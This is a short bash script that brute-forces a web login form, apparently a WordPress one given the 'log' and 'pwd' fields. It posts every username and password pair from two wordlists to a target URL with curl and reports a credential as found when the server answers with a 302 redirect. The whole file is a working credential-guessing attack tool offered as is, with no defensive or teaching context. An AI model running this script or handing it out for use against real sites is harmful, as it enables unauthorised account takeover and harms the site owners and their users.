#/bin/bash
TARGET=$1
USERS_LIST=$2
PASSWORDS_LIST=$3
for user in $(cat $USERS_LIST)
do
 for password in $(cat $PASSWORDS_LIST)
 do 
  CODE=$(curl -X POST $TARGET --data \
"log=$user&pwd=$password" -s -o /dev/null \
 -w "%{http_code}")
  if [ $CODE -eq 302 ]
  then
	echo -e "\e[92m Found : $user:$password \e[0m"
  else
	echo -e "\e[91m Not Found \e[0m"
  fi
 done
done
  

